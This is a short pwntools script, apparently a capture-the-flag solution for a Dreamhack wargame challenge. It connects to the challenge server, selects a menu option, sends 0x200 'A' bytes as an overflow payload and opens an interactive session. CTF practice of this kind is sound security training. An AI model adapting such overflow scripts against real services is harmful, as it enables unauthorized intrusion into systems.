from pwn import *

# nc host1.dreamhack.games 12799
p = remote("host1.dreamhack.games", 12799)

p.sendafter(">> ", "1")

pay = b""
pay += b"A" * 0x200

p.sendline(pay)

p.interactive()
